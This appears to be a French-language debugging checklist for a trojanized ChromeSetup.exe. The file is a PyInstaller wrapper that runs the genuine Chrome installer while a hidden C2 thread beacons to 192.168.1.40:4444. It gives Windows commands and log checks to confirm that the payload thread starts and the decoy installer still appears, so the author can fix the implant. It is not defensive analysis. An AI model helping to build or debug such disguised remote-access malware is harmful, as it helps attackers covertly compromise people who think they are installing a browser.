# Protocole de Debug Windows pour l'Exe Patché

## Objectif
Identifier pourquoi l'exe patché (ChromeSetup.exe) échoue au lancement sur Windows.

## Étapes

### 1. Préparation
- Télécharge l'artifact `ChromeSetup.exe` depuis GitHub Actions (lien fourni par l'app).
- Ou utilise le `dist/ChromeSetup.exe` compilé sur macOS.
- Place-le dans un dossier temporaire, par ex. `C:\Users\YourName\Desktop\test_c2`.

### 2. Test 1: Vérifier que c'est un exe valide
```cmd
cd C:\Users\YourName\Desktop\test_c2
dir ChromeSetup.exe
```
- Doit afficher la taille (environ 12 MB).

### 3. Test 2: Smoke test (sans réseau)
Vérifie que l'exe démarre correctement sans faire de réseau:
```cmd
set SELFTEST=1
ChromeSetup.exe
pause
```
- Si rien ne s'affiche: c'est normal (console cachée par --windowed).
- Ouvre ensuite `%TEMP%\c2_wrapper.log` pour voir les logs.
- Si SELFTEST passe, on peut continuer.

### 4. Test 3: Activer les logs complets
```cmd
set C2_DEBUG=1
ChromeSetup.exe
pause
```
- Attends 10 secondes (le C2 essaie de se connecter à 192.168.1.40:4444).
- Ouvre immédiatement après:
  - `%TEMP%\c2_wrapper.log`
  - `%TEMP%\c2_debug.log`

### 5. Analyse des logs

**c2_wrapper.log:**
- Doit contenir: "Launching original app", "C2 thread starting", etc.
- Si absent ou vide, le wrapper n'a pas pu démarrer → erreur à la charge PyInstaller.
- Si "Starting original app" absent, le C2 thread n'a pas commencé.
- Si "run_original_app error: …", il y a une erreur au lancement du ChromeSetup.exe original.

**c2_debug.log:**
- Doit contenir: "Attempting connection to 192.168.1.40:4444", "Connection failed", etc.
- Si absent, le payload n'a pas exécuté.
- Si "Connection failed", le serveur n'écoute pas (normal en test), mais le C2 retry.
- Cherche tout "Error: …" ou exception.

### 6. Test 4: Vérifier que Chrome se lance
```cmd
REM Sans logs, juste vérif du comportement
ChromeSetup.exe
```
- L'installateur Chrome doit apparaître quelques secondes après lancer l'exe.
- Si Chrome n'apparaît jamais, la ligne `run_original_app()` a échoué.

### 7. Si c2_wrapper.log n'existe pas du tout
Cela signifie que PyInstaller n'a pas pu charger le bundle ou le wrapper a planté avant le premier log.
- Essaie: `ChromeSetup.exe 2>&1 | clip` (capture stderr) et envoie.
- Ou ouvre une PowerShell et fais: `& "C:\path\to\ChromeSetup.exe"` pour voir les erreurs.

### 8. Logs importants à envoyer
- Contenu complet de `%TEMP%\c2_wrapper.log`
- Contenu complet de `%TEMP%\c2_debug.log`
- Message d'erreur si une fenêtre Windows apparaît
- Screenshots si besoin

## Chemins utiles sur Windows
```
%TEMP%\c2_wrapper.log          → C:\Users\YourName\AppData\Local\Temp\c2_wrapper.log
%TEMP%\c2_debug.log            → C:\Users\YourName\AppData\Local\Temp\c2_debug.log
```
Ou ouvre l'Explorateur Fichiers → `%TEMP%` et cherche ces fichiers.

## Quick Copy-Paste (tout-en-un)
```cmd
REM Ouvre cmd dans le dossier où est ChromeSetup.exe
set C2_DEBUG=1
ChromeSetup.exe
timeout /t 10
type %TEMP%\c2_wrapper.log
type %TEMP%\c2_debug.log
```

## Résultats attendus
- **Idéal:** Chrome se lance, logs montrent "C2 thread starting", "Attempting connection…", "Connection failed" (normal).
- **Diagnostic clair:** Logs affichent un "error: …" précis → on patch immédiatement.
- **Pas de logs:** Wrapper n'a pas pu exécuter → problème de PyInstaller ou ressources.
